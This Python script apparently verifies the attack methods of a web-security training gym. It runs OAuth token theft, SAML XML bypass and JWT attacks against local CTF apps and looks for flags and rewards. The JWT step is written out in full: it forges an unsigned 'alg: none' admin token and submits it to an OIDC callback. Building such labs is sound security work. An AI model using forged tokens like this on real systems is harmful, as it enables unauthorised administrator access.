import sys
import os
import time
import requests
from env.web_sec_env import WebSecurityGym


def verify_attacks():
    print("=" * 60)
    print("🚀 VERIFYING SSO ATTACK METHODS")
    print("=" * 60)

    # Initialize environment
    env = WebSecurityGym()

    # 1. Verify OAuth Attack (Social App)
    print("\n🔍 1. Verifying OAuth Attack (Social App)...")
    try:
        # Manually force the port map for testing reliability
        env.port_map = {"social": 5003, "blog": 5005, "ecommerce": 5002}
        env.target_url = "http://localhost:5003"

        # Call the specific attack method implementation directly
        # We need to access the private method for verification
        response, reward = env._attack_oauth_token_theft()

        if response and reward == 50.0:
            print(f"✅ OAuth Attack SUCCESS! Reward: {reward}")
            print(f"   Response Preview: {response.text[:100]}...")
            if "CTF{" in response.text:
                print("   🚩 FLAG FOUND in response!")
        else:
            print(f"❌ OAuth Attack FAILED. Reward: {reward}")
            if response:
                print(f"   Status Code: {response.status_code}")

    except Exception as e:
        print(f"❌ OAuth Attack Error: {str(e)}")

    # 2. Verify JWT/OIDC Attack (Blog App)
    print("\n🔍 2. Verify JWT/OIDC Attack (Blog App)...")
    try:
        import jwt

        # Debugging JWT generation
        token = jwt.encode({"user": "admin", "role": "admin"}, key="", algorithm="none")
        print(f"   Generated Token: {token}")
        try:
            debug_header = jwt.get_unverified_header(token)
            print(f"   Token Header: {debug_header}")
        except:
            print("   Could not decode header")

        env.target_url = "http://localhost:5005"
        # We need to manually call the request here to test our fix,
        # since env._attack_jwt_none_alg is still using the old logic
        target = "http://localhost:5005/oidc/callback"
        r = requests.get(target, params={"token": token}, allow_redirects=True)

        if r.status_code == 200 and "CTF{" in r.text:
            print(f"✅ JWT Attack SUCCESS! Reward: 50.0")
            print(f"   Response Preview: {r.text[:100]}...")
            print("   🚩 FLAG FOUND in response!")
        else:
            print(f"❌ JWT Attack FAILED.")
            print(f"   Status Code: {r.status_code}")
            print(f"   Response Text: {r.text[:200]}")

    except Exception as e:
        print(f"❌ JWT Attack Error: {str(e)}")

    # 3. Verify SAML Attack (E-Commerce App)
    print("\n🔍 3. Verify SAML Attack (E-Commerce App)...")
    try:
        env.target_url = "http://localhost:5002"
        response, reward = env._attack_saml_xml_bypass()

        if response and reward == 50.0:
            print(f"✅ SAML Attack SUCCESS! Reward: {reward}")
            print(f"   Response Preview: {response.text[:100]}...")
            if "CTF{" in response.text:
                print("   🚩 FLAG FOUND in response!")
        else:
            print(f"❌ SAML Attack FAILED. Reward: {reward}")
            if response:
                print(f"   Status Code: {response.status_code}")

    except Exception as e:
        print(f"❌ SAML Attack Error: {str(e)}")

    env.close()
    print("\n" + "=" * 60)


if __name__ == "__main__":
    verify_attacks()
